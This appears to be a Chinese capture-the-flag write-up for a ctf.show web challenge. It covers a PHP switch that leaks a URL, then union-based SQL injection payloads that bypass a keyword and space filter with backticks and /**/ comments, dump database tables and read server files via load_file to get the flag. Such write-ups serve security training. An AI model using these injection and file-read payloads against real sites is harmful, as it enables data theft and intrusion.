```
<?php
include("secret.php");

if(isset($_GET['c'])){
    $c = intval($_GET['c']);
    sleep($c);
    switch ($c) {
        case 1:
            echo '$url';
            break;
        case 2:
            echo '@A@';
            break;
        case 555555:
            echo $url;
        case 44444:
            echo "@A@";
            break;
        case 3333:
            echo $url;
            break;
        case 222:
            echo '@A@';
            break;
        case 222:
            echo '@A@';
            break;
        case 3333:
            echo $url;
            break;
        case 44444:
            echo '@A@';
        case 555555:
            echo $url;
            break;
        case 3:
            echo '@A@';
        case 6000000:
            echo "$url";
        case 1:
            echo '@A@';
            break;
    }
}

highlight_file(__FILE__);
```

分析当输入c=3时，可以得到url：here_1s_your_f1ag.php

访问here_1s_your_f1ag.php，页面是一个典型的注入页面，查看页面源码看到一串注释：

```html
<!--
	if(preg_match('/<!--
	if(preg_match('/information_schema\.tables|information_schema\.columns|linestring| |polygon/is', $_GET['query'])){
		die('@A@');
	}
		die('@A@');
	}
-->
```

提示会过滤information_schema\.tables、information_schema\.columns、linestring|、空格、polygon。

利用反引号（`）来绕过information_schema\.tables，/**/来绕过空格。

爆破数据库名：web

爆破表名：content：

```
query=5/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema='web'/**/--
```

爆破列名：id username password：

```\
query=5/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name='content'/**/--
```

爆破字段值：

1adminflag is not here!,2gtf1ywow,you can really dance,3Wowtell you a secret,secret has a secret...

```
query=5/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content/**/--
```

没有看到flag，但是提示flag在secret中，load_file查看secret.php源码：

```
query=5/**/union/**/select/**/load_file('/var/www/html/secret.php')/**/--
```

```
<?php
$url = 'here_1s_your_f1ag.php';
$file = '/tmp/gtf1y';
if(trim(@file_get_contents($file)) === 'ctf.show'){
	echo file_get_contents('/real_flag_is_here');
}')
```

提示flag在/real_flag_is_here中，直接查看文件源码,得到flag：

```
query=5/**/union/**/select/**/load_file('/real_flag_is_here')/**/--
```

```
ctfshow{f73594c3-55d1-49b5-8641-01a5a9a41572}
```

